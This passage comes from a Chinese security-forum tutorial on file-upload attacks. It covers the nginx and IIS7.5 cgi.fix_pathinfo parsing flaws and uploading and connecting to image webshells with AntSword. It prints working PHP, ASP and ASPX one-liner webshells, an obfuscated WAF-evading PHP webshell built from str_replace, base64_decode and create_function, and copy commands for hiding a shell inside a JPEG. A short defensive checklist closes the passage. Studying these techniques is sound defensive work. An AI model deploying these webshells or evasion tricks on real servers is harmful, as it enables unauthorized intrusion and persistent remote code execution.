我们将其更改后缀名为1.php.7z  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5119fdb668c9132bb2c86d357e3bd91aa4718502.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5119fdb668c9132bb2c86d357e3bd91aa4718502.png)  
连接木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0c34c325043954f8ff0e92ed5e9ba6c616c4099.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0c34c325043954f8ff0e92ed5e9ba6c616c4099.png)

### nginx解析漏洞

**漏洞原理**  
Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置 SCRIPT\_FILENAME。当访问 `www.xx.com/phpinfo.jpg/1.php`这个URL时， `$fastcgi_script_name`会被设置为`“phpinfo.jpg/1.php”，`然后构造成 `SCRIPT_FILENAME`传递给`PHP CGI`，但是PHP为什么会接受这样的参数，并将`phpinfo.jpg`作为PHP文件解析呢?这就要说到`fix_pathinfo`这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：  
PHP会认为`SCRIPTFILENAME`是`phpinfo.jpg`，而1.php是`PATHINFO`，所以就会将`phpinfo.jpg`作为PHP文件来解析了

**漏洞形式**

```html
www.xxxx.com/UploadFiles/image/1.jpg/1.php
www.xxxx.com/UploadFiles/image/1.jpg %00.php
www.xxxx.com/UploadFiles/image/1.jpg/ %20.php
```

**具体操作：**  
上传图片马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0e8e975b6d3f4808b03713369e24c82d3d1ea7c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0e8e975b6d3f4808b03713369e24c82d3d1ea7c.png)  
上传成功  
访问图片木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-704f9ebc0c538a932e394302e6ebb215823910e3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-704f9ebc0c538a932e394302e6ebb215823910e3.png)  
发现是基于nginx中间件的  
这时我们在末尾加入/xx.php进行nginx解析漏洞绕过  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-feba8f2838af230168f80306844cf31ccbbc24e3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-feba8f2838af230168f80306844cf31ccbbc24e3.png)  
连接木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d48a39d4bf7125e28af5701b160a5fca44c8950f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d48a39d4bf7125e28af5701b160a5fca44c8950f.png)

### IIS7.5解析漏洞

IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 cgi.fix\_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。

0x06 木马文件
=========

webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。根绝时代和技术的变迁，国外也有用python编写的脚本木马，不过国内常用的无外乎三种，大马，小马，一句话木马，具体使用场景和特地如下图。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f6a8652ce2372b55be7b6662c36a19de1eb48317.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f6a8652ce2372b55be7b6662c36a19de1eb48317.png)

一句话木马：
------

```html
php :<?php @eval($_POST['v']);?>
     <?php  $a = "a"."s"."s"."e"."r"."t";
         $a($_POST[v]);?>
asp :<% eval request("v")%>
aspx:<%@ Page Language="Jscript"%><%eval(Request.Item["v"],"unsafe");%>
```

**工具的使用**  
可以用蚁剑或菜刀等工具对一句话木马进行连接  
这里我用的是蚁剑  
准备好php一句话木马

```html
<?php @eval($_POST['v']);?>
```

在url地址框中输入http://127.0.0.1/shell.php 在连接密码框中输入v，点击保存  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2d0f7ecfca3df105fc7a99cd71cc5963e534da9a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2d0f7ecfca3df105fc7a99cd71cc5963e534da9a.png)  
连接成功后就能看到目标站点目录下的文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2fe82aab331f00d980103f8559df05fa280ff89c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2fe82aab331f00d980103f8559df05fa280ff89c.png)

简单的php过狗一句话：
------------

```html
$zk = "str_replace";
$ef = $zk("z", "", "zbazsze64_zdzeczodze");
     = str_replace("z", "", "zbazsze64_zdzeczodze")
     = "base64_decode"
$dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn");      
     = str_replace("p","","pcprpepaptpe_fpupnpcptpipopn")     
     = "create_function"
$zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx)));     
     = create_function('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx)))   
     = create_function('', base64_decode(str_replace("le", "", $ojj.$mt.$hsa.$fnx)))     
     = create_function('', base64_decode(str_replace("le", "", QGV2YWwoJF9QT1NUWydpMGle5BeSleleddKTs=)))     
    = create_function('', base64_decode("QGV2YWwoJF9QT1NUWydpMG5BeSddKTs="))     
    = create_function('', "@eval($_POST['i0nAy']);")
```

原理就是：打乱字符；编码技术；拆分组合；创建，匹配。

图片木马的制作
-------

### 方法一（工具）：

把要制作的图片拖给edjpgcom.exe，然后开始制作  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-897ecf9b21b7a5ca8244e2203a3cebeb0dbcddc2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-897ecf9b21b7a5ca8244e2203a3cebeb0dbcddc2.png)  
点击ok  
此时用txt的形式打开查看一下  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-83db8b23d6ed6e028c306fefc14aacf459700121.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-83db8b23d6ed6e028c306fefc14aacf459700121.png)

### 方法二：

```html
copy a.jpg/b + 1.php/a b.php
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a7de18590d2c5fd1104c07c98ee6f9c5ed13645.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a7de18590d2c5fd1104c07c98ee6f9c5ed13645.png)  
查看  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c0a384cfca3336bc0f08309d7ca65661e778f832.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c0a384cfca3336bc0f08309d7ca65661e778f832.png)

0x07 文件上传漏洞的防范
==============

遵循以下的规则可以最大程度降低文件上传漏洞的风险:  
➢对上传的文件的扩展名和文件报头信息在服务端与白名单对比，不符合白名单的不予保存。  
➢上传过程不应传递目录或文件路径, 使用预先设置路径列表中的匹配索引值,严禁泄露文件绝对路径  
➢对文件进行重命名,使用随机性好的文件目录和文件名进行保存。  
➢上传文件的临时目录和保存目录不允许执行权限。  
➢有条件时可将保存在内容服务器或者数据库中。  
➢确保上传的 文件放在安全的路径下，必要时可以将上传的文件防御web server之外的远程服务器。  
➢确保web server版本为最新，防止由于web server漏洞造成文件意外解析。  
➢部分文件上传攻击会配合本地其他漏洞进行，所以也要减少服务器其他可利用的漏洞。

参考：  
<https://www.cnblogs.com/0daybug/p/12311087.html>